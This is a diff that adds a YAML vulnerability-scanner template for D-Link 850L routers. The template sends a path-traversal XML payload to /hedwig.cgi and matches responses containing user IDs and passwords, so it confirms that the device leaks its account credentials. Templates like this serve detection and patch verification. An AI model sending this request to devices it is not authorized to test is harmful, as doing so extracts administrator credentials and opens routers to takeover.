@@ -1,0 +1,39 @@
+id: poc-yaml-dlink-850l-info-leak
+info:
+  name: Dlink 850l Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-disclosure
+  description: |
+    This template checks for information disclosure vulnerability in Dlink 850l devices by sending a specific XML payload.
+http:
+  - raw:
+      - |
+        POST /hedwig.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        Cookie: uid=R8tBjwtFc8
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <postxml>
+          <module>
+            <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
+          </module>
+        </postxml>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "content-type"
+          - "xml"
+      - type: word
+        part: body
+        words:
+          - "</usrid>"
+          - "</password>"
+          - "<result>OK</result>"
